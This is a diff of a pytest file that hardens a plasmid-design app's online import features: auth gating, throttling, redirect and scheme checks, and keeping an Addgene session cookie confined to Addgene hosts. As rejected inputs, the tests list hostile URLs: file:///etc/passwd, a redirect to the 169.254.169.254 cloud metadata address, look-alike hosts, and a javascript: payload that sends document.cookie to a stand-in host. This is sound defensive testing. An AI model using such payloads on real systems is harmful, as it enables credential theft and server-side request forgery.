@@ -91,10 +91,15 @@ def no_network(monkeypatch):
     def _boom(*a, **k):
         raise AssertionError("测试中不允许真实网络请求")
     monkeypatch.setattr(src.urllib.request, "urlopen", _boom)
+    monkeypatch.setattr(src, "_default_open", _boom)  # 自建 opener 同样禁网
     monkeypatch.setattr(src, "_MIN_INTERVAL", {})  # 免等待
+    monkeypatch.setattr(src, "_next_slot", {})     # 节流时间槽不跨用例
+    monkeypatch.setattr(src, "_addgene_index_cache", {})
     for k in ("ONLINE_IMPORT_ENABLED", "ONLINE_TIMEOUT", "SNAPGENE_BASE", "ENSEMBL_BASE",
               "UNIPROT_BASE", "ADDGENE_SESSION_COOKIE"):
         monkeypatch.delenv(k, raising=False)
+    # SnapGene 在线库默认关闭（审查 H2）；功能用例统一打开，默认值与关闭行为另有专门用例
+    monkeypatch.setenv("SNAPGENE_ONLINE_ENABLED", "true")
     cache.backend.clear_pattern("online:*")
     yield
     cache.backend.clear_pattern("online:*")
@@ -260,8 +265,9 @@ def test_ensembl_lookup_params():
 # ---------------------------------------------------------------- Addgene
 
 def test_addgene_never_bypasses_login():
-    meta = {"seqObjectId": "244694", "mapPngUrl": "https://x/a.png",
-            "genbankUrl": "https://x/a.gbk", "snapgeneUrl": "https://x/a.dna"}
+    meta = {"seqObjectId": "244694", "mapPngUrl": "https://media.addgene.org/a.png",
+            "genbankUrl": "https://media.addgene.org/a.gbk",
+            "snapgeneUrl": "https://media.addgene.org/a.dna"}
     assert src.addgene_metadata("244694", opener=_opener(meta))["seqObjectId"] == "244694"
     # 元数据里没有序列直链 → 同样按"需登录"处理
     with pytest.raises(src.AddgeneLoginRequired):
@@ -369,15 +375,15 @@ def test_snapgene_sets_cached(client, vectors_dir, monkeypatch):
                                                "filename": "pYES2.dna", "index": 0}])
 
     c, _ = client
-    first = c.get("/api/vectors/import/snapgene/sets")
-    second = c.get("/api/vectors/import/snapgene/sets")
+    first = c.get("/api/vectors/import/snapgene/sets", headers=_user())
+    second = c.get("/api/vectors/import/snapgene/sets", headers=_user())
     assert first.status_code == 200 and first.json()["count"] == 1
     assert second.json() == first.json() and len(calls) == 1
 
-    idx = c.get("/api/vectors/import/snapgene/sets/yeast_plasmids")
+    idx = c.get("/api/vectors/import/snapgene/sets/yeast_plasmids", headers=_user())
     assert idx.status_code == 200, idx.text
     assert idx.json()["count"] == 1 and idx.json()["plasmids"][0]["plasmid_id"] == "pYES2"
-    assert c.get("/api/vectors/import/snapgene/sets/..%2Fetc").status_code in (404, 422)
+    assert c.get("/api/vectors/import/snapgene/sets/..%2Fetc", headers=_user()).status_code in (404, 422)
 
 
 def test_snapgene_preview_and_import(client, vectors_dir, monkeypatch):
@@ -389,7 +395,7 @@ def test_snapgene_preview_and_import(client, vectors_dir, monkeypatch):
 
     c, _ = client
     prev = c.get("/api/vectors/import/snapgene/preview",
-                 params={"set_id": "yeast_plasmids", "plasmid_id": "pYES2"})
+                 params={"set_id": "yeast_plasmids", "plasmid_id": "pYES2"}, headers=_user())
     assert prev.status_code == 200, prev.text
     d = prev.json()
     assert d["length"] == 300 and d["topology"] == "circular"
@@ -454,7 +460,8 @@ def test_addgene_routes(client, vectors_dir, monkeypatch):
     d = r.json()
     assert d["sequence_available"] is False and d["metadata"]["seqObjectId"] == "244694"
     assert "上传文件" in d["note"]
-    r2 = c.get("/api/vectors/import/addgene/244694", params={"try_sequence": 1})
+    r2 = c.get("/api/vectors/import/addgene/244694", params={"try_sequence": 1},
+               headers=_admin())
     assert r2.status_code == 403 and "绕过登录" in r2.json()["detail"]
     assert c.get("/api/vectors/import/addgene/abc").status_code == 422
 
@@ -494,8 +501,22 @@ def test_rate_limit_buckets_unchanged():
     from app.rate_limit import classify_endpoint
     assert classify_endpoint("POST", "/api/vectors/import/snapgene") == "upload"
     assert classify_endpoint("POST", "/api/vectors/import/ensembl") == "upload"
-    assert classify_endpoint("GET", "/api/vectors/import/snapgene/sets") == "default"
     assert classify_endpoint("GET", "/api/vectors/import/sources") == "default"
+
+
+@pytest.mark.parametrize("path", [
+    "/api/vectors/import/snapgene/sets",
+    "/api/vectors/import/snapgene/sets/yeast_plasmids",
+    "/api/vectors/import/snapgene/preview",
+    "/api/vectors/import/ensembl/lookup/ENSG00000139618",
+    "/api/vectors/import/ensembl/preview",
+    "/api/map/import/snapgene/sets",
+    "/api/map/import/snapgene/sets/yeast_plasmids",
+])
+def test_outbound_proxy_gets_use_ncbi_bucket(path):
+    """会外呼的只读代理两侧口径一致，都走 ncbi 档（审查 M4）"""
+    from app.rate_limit import classify_endpoint
+    assert classify_endpoint("GET", path) == "ncbi"
 
 
 # ---------------------------------------------------------------- 落盘形状回归
@@ -543,13 +564,13 @@ def test_online_sources_shared_between_map_and_vectors(client, monkeypatch):
                                                "filename": "pYES2.dna", "index": 0}])
 
     c, _ = client
-    a = c.get("/api/vectors/import/snapgene/sets")
-    b = c.get("/api/map/import/snapgene/sets")
+    a = c.get("/api/vectors/import/snapgene/sets", headers=_user())
+    b = c.get("/api/map/import/snapgene/sets", headers=_user())
     assert a.status_code == b.status_code == 200
     assert b.json() == a.json() and len(calls) == 1
 
-    ia = c.get("/api/vectors/import/snapgene/sets/yeast_plasmids")
-    ib = c.get("/api/map/import/snapgene/sets/yeast_plasmids")
+    ia = c.get("/api/vectors/import/snapgene/sets/yeast_plasmids", headers=_user())
+    ib = c.get("/api/map/import/snapgene/sets/yeast_plasmids", headers=_user())
     assert ia.json() == ib.json() and ib.json()["count"] == 1
 
 
@@ -572,7 +593,7 @@ def test_map_import_snapgene_builds_document_once(client, vectors_dir, monkeypat
 
     c, _ = client
     r = c.post("/api/map/import/snapgene",
-               json={"set_id": "yeast_plasmids", "plasmid_id": "pYES2"})
+               json={"set_id": "yeast_plasmids", "plasmid_id": "pYES2"}, headers=_user())
     assert r.status_code == 200, r.text
     d = r.json()
     assert d["schema"] == "plasmid-map/1" and d["name"] == "pYES2"
@@ -582,12 +603,12 @@ def test_map_import_snapgene_builds_document_once(client, vectors_dir, monkeypat
     assert calls == [("yeast_plasmids", "pYES2", MAP_MAX_LENGTH)]
 
     r2 = c.post("/api/map/import/snapgene",
-                json={"set_id": "yeast_plasmids", "plasmid_id": "pYES2"})
+                json={"set_id": "yeast_plasmids", "plasmid_id": "pYES2"}, headers=_user())
     assert r2.json() == d and len(calls) == 1        # MapDocument 缓存命中，不重复下载
     # 换酶组：按选项分键 → 重新构建（但不再下载集合索引）
     r3 = c.post("/api/map/import/snapgene",
                 json={"set_id": "yeast_plasmids", "plasmid_id": "pYES2",
-                      "enzyme_set": "golden_gate"})
+                      "enzyme_set": "golden_gate"}, headers=_user())
     assert r3.status_code == 200 and r3.json()["meta"]["enzyme_set"] == "golden_gate"
     assert len(calls) == 2
 
@@ -598,9 +619,9 @@ def test_map_import_snapgene_errors_and_gating(client, vectors_dir, monkeypatch)
     monkeypatch.setattr(oi, "snapgene_plasmid_record", _boom)
 
     c, s = client
-    r = c.post("/api/map/import/snapgene", json={"set_id": "s", "plasmid_id": "p"})
+    r = c.post("/api/map/import/snapgene", json={"set_id": "s", "plasmid_id": "p"}, headers=_user())
     assert r.status_code == 404 and "404" in r.json()["detail"]
-    assert c.post("/api/map/import/snapgene", json={}).status_code == 422
+    assert c.post("/api/map/import/snapgene", json={}, headers=_user()).status_code == 422
 
     s["anonymous_features"] = [f for f in ALL_FEATURES if f != "map"]
     assert c.get("/api/map/import/sources").status_code == 403
@@ -668,6 +689,26 @@ def _admin():
 
 
 _ADMIN_HEADERS = None
+_USER_HEADERS = None
+
+
+def _user():
+    """模块级普通登录用户令牌（SnapGene 在线库只读端点需登录，审查 H2）"""
+    global _USER_HEADERS
+    if _USER_HEADERS is None:
+        import uuid
+        from app.auth.jwt_auth import create_access_token, db_user_to_user, hash_password
+        from app.database import SessionLocal, create_user
+        email = f"usr-online-{uuid.uuid4().hex[:8]}@example.com"
+        db = SessionLocal()
+        try:
+            u = create_user(db, email=email, username=email.split("@")[0],
+                            hashed_password=hash_password("Passw0rd!!"), is_admin=False,
+                            email_verified=True)
+            _USER_HEADERS = {"Authorization": f"Bearer {create_access_token(db_user_to_user(u))}"}
+        finally:
+            db.close()
+    return _USER_HEADERS
 
 
 # ================================================================ 出处记录（data_provenance）
@@ -820,20 +861,21 @@ def test_save_map_as_vector_endpoint(client, vectors_dir):
 # ================================================================ Addgene（用户自备凭据）
 
 def test_addgene_cookie_only_sent_to_addgene(monkeypatch):
-    """凭据只发给 addgene.org：上游元数据给的直链指向别处时不带 Cookie"""
+    """凭据只发给 https 的 addgene.org：直链指向别处或是 http 时不带 Cookie"""
     monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "SESSION=secret-token")
     assert src.addgene_has_session() is True
     assert src.addgene_session_cookie() == "SESSION=secret-token"
     for host in ("https://www.addgene.org/api/x/", "https://addgene.org/a.gbk",
-                 "https://media.addgene.org/a.gbk"):
-        assert src._addgene_session_headers(host)["Cookie"] == "SESSION=secret-token"
+                 "https://media.addgene.org/a.gbk", "https://www.addgene.org:443/a.gbk"):
+        assert src._addgene_cookie_for(host) == "SESSION=secret-token"
     for evil in ("https://evil.example.com/a.gbk", "https://addgene.org.evil.com/a.gbk",
-                 "http://127.0.0.1/a.gbk"):
-        assert src._addgene_session_headers(evil) == {}
+                 "http://127.0.0.1/a.gbk", "http://www.addgene.org/a.gbk",
+                 "file:///etc/passwd", "https://evil.com@x.example/a"):
+        assert src._addgene_cookie_for(evil) is None
 
     monkeypatch.delenv("ADDGENE_SESSION_COOKIE")
     assert src.addgene_has_session() is False and src.addgene_session_cookie() == ""
-    assert src._addgene_session_headers("https://www.addgene.org/api/x/") == {}
+    assert src._addgene_cookie_for("https://www.addgene.org/api/x/") is None
 
 
 def test_addgene_record_uses_session_and_parses(monkeypatch):
@@ -999,9 +1041,16 @@ def test_sources_payload_lists_uniprot_and_addgene_session(client, vectors_dir, 
     assert ids["addgene"]["session_configured"] is False and ids["addgene"]["importable"] is False
 
     monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "SESSION=x")
-    ids2 = {s["id"]: s for s in c.get("/api/vectors/import/sources").json()["sources"]}
+    ids2 = {s["id"]: s for s in c.get("/api/vectors/import/sources",
+                                        headers=_admin()).json()["sources"]}
     assert ids2["addgene"]["session_configured"] is True
     assert ids2["addgene"]["importable"] is True and "已配置" in ids2["addgene"]["note"]
+    # 会话是否配置只告诉管理员（审查 M1）：匿名与普通用户一律 False
+    for headers in (None, _user()):
+        for path in ("/api/vectors/import/sources", "/api/map/import/sources"):
+            ad = {s["id"]: s for s in c.get(path, headers=headers or {}).json()["sources"]}
+            assert ad["addgene"]["session_configured"] is False
+            assert ad["addgene"]["importable"] is False and "已配置" not in ad["addgene"]["note"]
 
 
 def test_online_import_rate_limit_buckets_for_new_endpoints():
@@ -1013,3 +1062,660 @@ def test_online_import_rate_limit_buckets_for_new_endpoints():
     assert classify_endpoint("GET", "/api/vectors/import/addgene/52961") == "ncbi"
     assert classify_endpoint("GET", "/api/vectors/import/addgene/search") == "default"
     assert classify_endpoint("GET", "/api/vectors/import/sources") == "default"
+
+
+# ================================================================ 重定向与 scheme（审查 H1）
+# 走真实的 urllib OpenerDirector（src._default_open → build_opener + 重定向处理器），
+# 只把最底层的 http(s)_open 换成内存里的"互联网"，从而真实执行 urllib 的 3xx 处理链。
+
+import email.message
+import urllib.request
+import urllib.response
+
+_REAL_DEFAULT_OPEN = src._default_open
+
+
+class _FakeNet:
+    """url → (status, headers, body)；记录每次真正发出的请求（含 unredirected 头）"""
+
+    def __init__(self, routes):
+        self.routes = routes
+        self.requests = []
+
+    def handlers(self):
+        net = self
+
+        def _serve(req):
+            url = req.full_url
+            hdrs = {k.lower(): v for k, v in req.header_items()}
+            net.requests.append((url, hdrs))
+            status, headers, body = net.routes.get(url, (404, {}, b"nope"))
+            msg = email.message.Message()
+            for k, v in headers.items():
+                msg[k] = v
+            resp = urllib.response.addinfourl(io.BytesIO(body), msg, url, status)
+            resp.msg = "fake"
+            return resp
+
+        class _Https(urllib.request.HTTPSHandler):
+            def https_open(self, req):
+                return _serve(req)
+
+        class _Http(urllib.request.HTTPHandler):
+            def http_open(self, req):
+                return _serve(req)
+
+        return [_Https(), _Http()]
+
+
+@pytest.fixture()
+def fake_net(monkeypatch):
+    def _make(routes):
+        net = _FakeNet(routes)
+        monkeypatch.setattr(src, "_default_open", _REAL_DEFAULT_OPEN)
+        monkeypatch.setattr(src, "_EXTRA_HANDLERS", net.handlers())
+        return net
+    return _make
+
+
+def test_stdlib_redirect_would_leak_plain_cookie_header(fake_net):
+    """对照组：标准 urllib 自动重定向会把普通 Cookie 头带到第三方主机（H1 的根因），
+    而 add_unredirected_header 加的头不会被带走。"""
+    net = fake_net({
+        "https://sequences.addgene.org/x.gbk": (302, {"Location": "https://evil.example/x"}, b""),
+        "https://evil.example/x": (200, {}, b"LOCUS"),
+    })
+    std = urllib.request.build_opener(*net.handlers())
+    std.open(urllib.request.Request("https://sequences.addgene.org/x.gbk",
+                                    headers={"Cookie": "sessionid=SECRET"})).read()
+    assert net.requests[-1][0] == "https://evil.example/x"
+    assert net.requests[-1][1].get("cookie") == "sessionid=SECRET"   # 泄露
+
+    net.requests.clear()
+    req = urllib.request.Request("https://sequences.addgene.org/x.gbk")
+    req.add_unredirected_header("Cookie", "sessionid=SECRET")
+    std.open(req).read()
+    assert net.requests[0][1].get("cookie") == "sessionid=SECRET"
+    assert "cookie" not in net.requests[1][1]
+
+
+def test_cookie_not_sent_across_host_redirect(fake_net, monkeypatch):
+    """Addgene 直链 302 到第三方主机：不跟随（主机不在白名单），且第三方从未收到请求"""
+    monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "sessionid=SECRET")
+    net = fake_net({
+        "https://www.addgene.org/api/get-sequence-file-collection/52961/":
+            (200, {}, json.dumps({"genbankUrl": "https://sequences.addgene.org/x.gbk"}).encode()),
+        "https://sequences.addgene.org/x.gbk":
+            (302, {"Location": "https://bucket.s3.example.com/x.gbk?sig=1"}, b""),
+        "https://bucket.s3.example.com/x.gbk?sig=1": (200, {}, _gbk()),
+    })
+    with pytest.raises(src.UnsafeUrlError) as ei:
+        src.addgene_sequence_bytes("52961")
+    assert "白名单" in str(ei.value)
+    urls = [u for u, _ in net.requests]
+    assert "https://bucket.s3.example.com/x.gbk?sig=1" not in urls
+    # 元数据接口本身不带 Cookie（只有直链下载才带）
+    assert "cookie" not in net.requests[0][1]
+    assert net.requests[1][1].get("cookie") == "sessionid=SECRET"
+
+
+def test_cookie_dropped_on_cross_host_hop_within_addgene(fake_net, monkeypatch):
+    """addgene 子域之间跳转（白名单内）：允许跟随，但跨主机后不再带 Cookie"""
+    monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "sessionid=SECRET")
+    net = fake_net({
+        "https://www.addgene.org/api/get-sequence-file-collection/52961/":
+            (200, {}, json.dumps({"genbankUrl": "https://sequences.addgene.org/x.gbk"}).encode()),
+        "https://sequences.addgene.org/x.gbk":
+            (302, {"Location": "https://media.addgene.org/x.gbk"}, b""),
+        "https://media.addgene.org/x.gbk":
+            (302, {"Location": "https://sequences.addgene.org/final.gbk"}, b""),
+        "https://sequences.addgene.org/final.gbk": (200, {}, _gbk()),
+    })
+    data = src.addgene_sequence_bytes("52961")
+    assert data.startswith(b"LOCUS")
+    hops = {u: h for u, h in net.requests}
+    assert hops["https://sequences.addgene.org/x.gbk"].get("cookie") == "sessionid=SECRET"
+    assert "cookie" not in hops["https://media.addgene.org/x.gbk"]
+    # 跳回原主机也不再恢复凭据（一旦跨主机即永久丢弃）
+    assert "cookie" not in hops["https://sequences.addgene.org/final.gbk"]
+
+
+def test_redirect_downgrade_to_http_rejected(fake_net, monkeypatch):
+    monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "sessionid=SECRET")
+    net = fake_net({
+        "https://sequences.addgene.org/x.gbk":
+            (301, {"Location": "http://sequences.addgene.org/x.gbk"}, b""),
+        "http://sequences.addgene.org/x.gbk": (200, {}, _gbk()),
+    })
+    with pytest.raises(src.UnsafeUrlError):
+        src._http_get("https://sequences.addgene.org/x.gbk", max_bytes=1 << 20,
+                      cookie="sessionid=SECRET")
+    assert [u for u, _ in net.requests] == ["https://sequences.addgene.org/x.gbk"]
+
+
+def test_redirect_hop_limit_and_relative_location(fake_net):
+    base = src.ENSEMBL_BASE
+    net = fake_net({
+        f"{base}/a": (302, {"Location": "/b"}, b""),
+        f"{base}/b": (307, {"Location": f"{base}/c"}, b""),
+        f"{base}/c": (200, {}, b"ok"),
+        f"{base}/loop": (302, {"Location": f"{base}/loop"}, b""),
+    })
+    assert src._http_get(f"{base}/a", max_bytes=100) == b"ok"
+    with pytest.raises(src.OnlineSourceError) as ei:
+        src._http_get(f"{base}/loop", max_bytes=100)
+    assert ei.value.status == 502 and "跳" in str(ei.value)
+    assert sum(1 for u, _ in net.requests if u.endswith("/loop")) == src._MAX_REDIRECTS + 1
+
+
+def test_redirect_to_private_or_unknown_host_rejected(fake_net):
+    """SnapGene/Ensembl/UniProt 外呼被上游 302 到内网/任意主机：拒绝（SSRF 面）"""
+    net = fake_net({
+        f"{src.ENSEMBL_BASE}/x": (302, {"Location": "https://169.254.169.254/latest"}, b""),
+    })
+    with pytest.raises(src.UnsafeUrlError):
+        src._http_get(f"{src.ENSEMBL_BASE}/x", max_bytes=100)
+    assert all("169.254" not in u for u, _ in net.requests)
+
+
+@pytest.mark.parametrize("direct", [
+    "file:///etc/passwd", "http://www.addgene.org/x.gbk", "ftp://www.addgene.org/x.gbk",
+    "data:text/plain,LOCUS", "https://evil.example.com/x.gbk",
+    "https://www.addgene.org.evil.com/x.gbk",
+])
+def test_addgene_direct_link_scheme_and_host_checked(monkeypatch, direct):
+    """上游 JSON 给出的直链：非 https / 非 addgene 主机一律拒绝，且根本不外呼"""
+    monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "sessionid=SECRET")
+    monkeypatch.setattr(src, "addgene_metadata", lambda oid, **kw: {"genbankUrl": direct})
+    calls = []
+    with pytest.raises(src.UnsafeUrlError):
+        src.addgene_sequence_bytes("52961", opener=_opener(b"LOCUS", calls))
+    assert calls == []
+
+
+def test_checked_host_uses_bare_hostname():
+    assert src._checked_host("https://www.addgene.org:443/a") == "www.addgene.org"
+    assert src._checked_host(f"{src.SNAPGENE_BASE}/sets.php?xml") == "www.snapgene.com"
+    for bad in ("http://rest.ensembl.org/x", "https://rest.ensembl.org.evil.com/x",
+                "https://user@evil.com/x", "file:///etc/passwd", ""):
+        with pytest.raises(src.UnsafeUrlError):
+            src._checked_host(bad)
+
+
+# ================================================================ SnapGene 在线库开关（审查 H2）
+
+_SNAPGENE_READ_ENDPOINTS = [
+    ("GET", "/api/vectors/import/snapgene/sets", None),
+    ("GET", "/api/vectors/import/snapgene/sets/yeast_plasmids", None),
+    ("GET", "/api/vectors/import/snapgene/preview?set_id=yeast_plasmids&plasmid_id=pYES2", None),
+    ("GET", "/api/map/import/snapgene/sets", None),
+    ("GET", "/api/map/import/snapgene/sets/yeast_plasmids", None),
+    ("POST", "/api/map/import/snapgene", {"set_id": "yeast_plasmids", "plasmid_id": "pYES2"}),
+]
+
+
+def _call(c, method, url, body, headers=None):
+    if method == "GET":
+        return c.get(url, headers=headers or {})
+    return c.post(url, json=body, headers=headers or {})
+
+
+def _no_upstream(monkeypatch):
+    """任何 SnapGene 外呼都算失败：开关/鉴权必须在外呼之前拦下"""
+    def _boom(*a, **k):
+        raise AssertionError("不应外呼 SnapGene")
+    for name in ("snapgene_sets", "snapgene_set_index", "snapgene_plasmid_bytes"):
+        monkeypatch.setattr(src, name, _boom)
+    monkeypatch.setattr(oi, "snapgene_plasmid_record", _boom)
+
+
+def test_snapgene_online_default_off(monkeypatch):
+    monkeypatch.delenv("SNAPGENE_ONLINE_ENABLED", raising=False)
+    assert src.snapgene_online_enabled() is False
+    # 与总开关相互独立：总开关开着，SnapGene 仍是关的
+    assert src.import_enabled() is True
+    for raw, want in (("true", True), ("1", True), ("on", True), ("false", False),
+                      ("", False), ("nope", False)):
+        monkeypatch.setenv("SNAPGENE_ONLINE_ENABLED", raw)
+        assert src.snapgene_online_enabled() is want
+
+
+def test_snapgene_core_refuses_when_off(monkeypatch):
+    """核心层也兜底：开关关闭时连 opener 都不调用"""
+    monkeypatch.delenv("SNAPGENE_ONLINE_ENABLED", raising=False)
+    seen = []
+    for fn, args in ((src.snapgene_sets, ()), (src.snapgene_set_index, ("yeast_plasmids",)),
+                     (src.snapgene_plasmid_bytes, ("yeast_plasmids", "pYES2"))):
+        with pytest.raises(MapParseError) as ei:
+            fn(*args, opener=_opener(SETS_XML, seen))
+        assert ei.value.status == 404 and "SNAPGENE_ONLINE_ENABLED" in str(ei.value)
+    assert seen == []
+
+
+@pytest.mark.parametrize("method,url,body", _SNAPGENE_READ_ENDPOINTS)
+def test_snapgene_endpoints_404_when_off(client, vectors_dir, monkeypatch, method, url, body):
+    monkeypatch.delenv("SNAPGENE_ONLINE_ENABLED", raising=False)
+    _no_upstream(monkeypatch)
+    c, _ = client
+    for headers in (None, _user(), _admin()):
+        r = _call(c, method, url, body, headers)
+        assert r.status_code == 404, r.text
+        assert "SNAPGENE_ONLINE_ENABLED" in r.json()["detail"]
+
+
+def test_snapgene_save_404_when_off_even_for_admin(client, vectors_dir, monkeypatch):
+    monkeypatch.delenv("SNAPGENE_ONLINE_ENABLED", raising=False)
+    _no_upstream(monkeypatch)
+    c, _ = client
+    body = {"set_id": "yeast_plasmids", "plasmid_id": "pYES2"}
+    for headers in (None, _user(), _admin()):
+        r = c.post("/api/vectors/import/snapgene", json=body, headers=headers or {})
+        assert r.status_code == 404 and "SNAPGENE_ONLINE_ENABLED" in r.json()["detail"]
+    assert list(vectors_dir.iterdir()) == []
+
+
+@pytest.mark.parametrize("method,url,body", _SNAPGENE_READ_ENDPOINTS)
+def test_snapgene_endpoints_require_login_when_on(client, vectors_dir, monkeypatch,
+                                                  method, url, body):
+    _no_upstream(monkeypatch)
+    c, _ = client
+    r = _call(c, method, url, body)
+    assert r.status_code == 401 and "登录" in r.json()["detail"]
+
+
+def test_snapgene_save_stays_admin_only_when_on(client, vectors_dir, monkeypatch):
+    _no_upstream(monkeypatch)
+    c, _ = client
+    body = {"set_id": "yeast_plasmids", "plasmid_id": "pYES2"}
+    assert c.post("/api/vectors/import/snapgene", json=body).status_code == 401
+    assert c.post("/api/vectors/import/snapgene", json=body, headers=_user()).status_code == 403
+
+
+def test_sources_payload_reports_snapgene_flag(client, vectors_dir, monkeypatch):
+    c, _ = client
+    on = c.get("/api/map/import/sources").json()
+    sg = next(s for s in on["sources"] if s["id"] == "snapgene")
+    assert on["snapgene_online_enabled"] is True and sg["enabled"] is True
+    assert sg["requires_login"] is True and sg["importable"] is True
+
+    monkeypatch.delenv("SNAPGENE_ONLINE_ENABLED", raising=False)
+    for path in ("/api/map/import/sources", "/api/vectors/import/sources"):
+        off = c.get(path).json()
+        sg = next(s for s in off["sources"] if s["id"] == "snapgene")
+        assert off["snapgene_online_enabled"] is False
+        assert sg["enabled"] is False and sg["importable"] is False
+        assert "SNAPGENE_ONLINE_ENABLED" in sg["note"]
+        # 其他来源不受 SnapGene 开关影响
+        assert off["enabled"] is True
+
+
+# ================================================================ Addgene try_sequence 仅管理员（审查 M1）
+
+def test_addgene_try_sequence_admin_only(client, vectors_dir, monkeypatch):
+    """配置了部署方会话时，匿名/普通用户不能驱动它去下载全长序列"""
+    monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "sessionid=SECRET")
+    monkeypatch.setattr(osr.src, "addgene_metadata", lambda oid, **kw: {"seqObjectId": oid})
+    calls = []
+
+    def _seq(oid, **kw):
+        calls.append(oid)
+        return b"LOCUS x"
+    monkeypatch.setattr(osr.src, "addgene_sequence_bytes", _seq)
+
+    c, _ = client
+    anon = c.get("/api/vectors/import/addgene/52961", params={"try_sequence": "true"})
+    assert anon.status_code == 401
+    user = c.get("/api/vectors/import/addgene/52961", params={"try_sequence": "true"},
+                 headers=_user())
+    assert user.status_code == 403
+    assert calls == []          # 未经管理员，绝不以部署方账号外呼
+
+    # 不带 try_sequence 的元数据仍对匿名开放，但不暴露会话是否配置
+    meta = c.get("/api/vectors/import/addgene/52961")
+    assert meta.status_code == 200 and meta.json()["session_configured"] is False
+    assert calls == []
+
+    adm = c.get("/api/vectors/import/addgene/52961", params={"try_sequence": "true"},
+                headers=_admin())
+    assert adm.status_code == 200, adm.text
+    body = adm.json()
+    assert body["sequence_available"] is True and body["sequence_bytes"] == 7
+    assert body["session_configured"] is True and calls == ["52961"]
+
+
+# ================================================================ Addgene 会话仅适合单用户（审查 M2）
+
+class _FakeQuery:
+    def __init__(self, n):
+        self.n = n
+
+    def filter(self, *a, **k):
+        return self
+
+    def count(self):
+        return self.n
+
+
+class _FakeDB:
+    def __init__(self, n):
+        self.n = n
+
+    def query(self, *a):
+        return _FakeQuery(self.n)
+
+    def close(self):
+        pass
+
+
+@pytest.mark.parametrize("cookie,registration,users,expect", [
+    ("", True, 5, None),                        # 未配置会话：不告警
+    ("sessionid=S", False, 1, None),            # 单用户自托管：不告警
+    ("sessionid=S", True, 1, "开放注册"),
+    ("sessionid=S", False, 3, "3 个启用账号"),
+])
+def test_addgene_shared_session_warning(monkeypatch, caplog, cookie, registration, users, expect):
+    import app.database as dbmod
+    if cookie:
+        monkeypatch.setenv("ADDGENE_SESSION_COOKIE", cookie)
+    monkeypatch.setattr(site_settings, "get_settings",
+                        lambda force_refresh=False: {"registration_open": registration})
+    monkeypatch.setattr(dbmod, "SessionLocal", lambda: _FakeDB(users))
+    msg = oi.addgene_shared_session_warning()
+    if expect is None:
+        assert msg is None
+    else:
+        assert msg and expect in msg and "单用户" in msg and "上传文件" in msg
+        assert cookie not in msg            # 绝不回显 Cookie
+    caplog.clear()
+    with caplog.at_level("WARNING", logger="plasmid_designer.online_import"):
+        oi.log_addgene_shared_session_warning()
+    warned = [r for r in caplog.records if r.name == "plasmid_designer.online_import"]
+    assert bool(warned) is (expect is not None)
+    assert all("sessionid=S" not in r.getMessage() for r in warned)
+
+
+def test_addgene_shared_session_warning_tolerates_db_errors(monkeypatch):
+    import app.database as dbmod
+    monkeypatch.setenv("ADDGENE_SESSION_COOKIE", "sessionid=S")
+
+    def _boom(*a, **k):
+        raise RuntimeError("db down")
+    monkeypatch.setattr(site_settings, "get_settings", _boom)
+    monkeypatch.setattr(dbmod, "SessionLocal", _boom)
+    assert oi.addgene_shared_session_warning() is None
+
+
+# ================================================================ 节流（审查 M3）
+
+def test_throttle_does_not_serialize_different_hosts(monkeypatch):
+    """A 站点在排队 sleep 时，B 站点的请求不能被同一把锁卡住（旧实现锁内 sleep）"""
+    import threading
+    import time as _time
+    monkeypatch.setattr(src, "_MIN_INTERVAL", {"a.example": 0.6, "b.example": 0.6})
+    src._throttle("a.example")                     # 占掉 a 的当前槽
+    t = threading.Thread(target=src._throttle, args=("a.example",))   # 需等 ~0.6 s
+    t.start()
+    _time.sleep(0.05)                              # 确保线程已进入 sleep
+    t0 = _time.monotonic()
+    src._throttle("b.example")
+    elapsed = _time.monotonic() - t0
+    t.join()
+    assert elapsed < 0.3, f"不同站点被串行化：B 等了 {elapsed:.2f}s"
+
+
+def test_throttle_reserves_slots_and_bounds_queue(monkeypatch):
+    waits = []
+    monkeypatch.setattr(src.time, "sleep", lambda s: waits.append(round(s, 1)))
+    monkeypatch.setattr(src, "_MIN_INTERVAL", {"x.example": 1.0})
+    monkeypatch.setenv("ONLINE_THROTTLE_MAX_WAIT", "1.5")
+    src._throttle("x.example")
+    src._throttle("x.example")
+    assert waits == [1.0]                          # 第二个请求排到下一个槽
+    with pytest.raises(src.OnlineSourceError) as ei:
+        src._throttle("x.example")                 # 需等 ~2 s > 1.5 s 上限
+    assert ei.value.status == 429 and "排队" in str(ei.value)
+    assert waits == [1.0]                          # 被拒的请求不 sleep、不占槽
+    assert src._next_slot["x.example"] - src.time.monotonic() < 2.1
+
+
+def test_throttle_queue_full_maps_to_http_429(client, monkeypatch):
+    c, _ = client
+    monkeypatch.setattr(src, "_MIN_INTERVAL", {"rest.ensembl.org": 100.0})
+    monkeypatch.setenv("ONLINE_THROTTLE_MAX_WAIT", "1")
+    monkeypatch.setattr(src, "_next_slot", {"rest.ensembl.org": src.time.monotonic() + 50})
+    r = c.get("/api/vectors/import/ensembl/lookup/ENSG00000139618")
+    assert r.status_code == 429 and "排队" in r.json()["detail"]
+
+
+# ================================================================ 出处 URL 只收 http(s)（审查 M5）
+
+_MAP_PAYLOAD = {"name": "urlCheck", "sequence": SEQ300, "topology": "circular",
+                "features": [], "source": "paste"}
+
+
+@pytest.mark.parametrize("bad", [
+    "javascript:alert(1)", " JavaScript:fetch('//x/'+document.cookie)", "data:text/html,<b>",
+    "vbscript:msgbox", "file:///etc/passwd", "//evil.example/x", "ftp://x/y", "http://",
+    "https://exa mple.com",
+])
+def test_save_map_as_vector_rejects_non_http_url(client, vectors_dir, bad):
+    c, _ = client
+    r = c.post("/api/vectors/import/from-map", json=dict(_MAP_PAYLOAD, url=bad),
+               headers=_admin())
+    assert r.status_code == 422, r.text
+    assert list(vectors_dir.iterdir()) == []
+
+
+def test_save_map_as_vector_accepts_http_url(client, vectors_dir):
+    c, _ = client
+    for i, ok in enumerate(("https://www.ncbi.nlm.nih.gov/nuccore/L09137", "HTTP://example.org/a?b=1", "")):
+        r = c.post("/api/vectors/import/from-map",
+                   json=dict(_MAP_PAYLOAD, name=f"urlOk{i}", url=f"  {ok}  "), headers=_admin())
+        assert r.status_code == 200, r.text
+        assert r.json()["vector"]["url"] == ok.strip()
+        assert r.json()["vector"]["provenance"].get("url", "") == ok.strip()
+
+
